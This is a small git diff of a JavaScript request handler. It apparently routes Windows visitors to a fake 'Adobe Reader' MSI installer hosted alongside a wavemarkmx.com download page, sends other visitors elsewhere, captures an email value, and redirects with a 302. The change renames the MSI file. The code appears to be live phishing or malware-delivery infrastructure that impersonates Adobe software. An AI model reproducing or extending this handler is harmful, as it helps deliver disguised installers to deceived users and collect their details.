@@ -4,7 +4,7 @@ export default function handler(req, res) {
 
   const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
     'https://wavemarkmx.com/adober/reader/download.html';
-  const MSI_PATH = '/Reader_Adobe-en_install.msi';
+  const MSI_PATH = '/Readers_Adobe-en_install.msi';
   const NON_WINDOWS_TARGET = 'https://wavemarkmx.com/cg';
 
   let email = '';
@@ -56,6 +56,7 @@ export default function handler(req, res) {
   res.writeHead(302, { Location: finalUrl });
   res.end();
 }
+
 
 
 
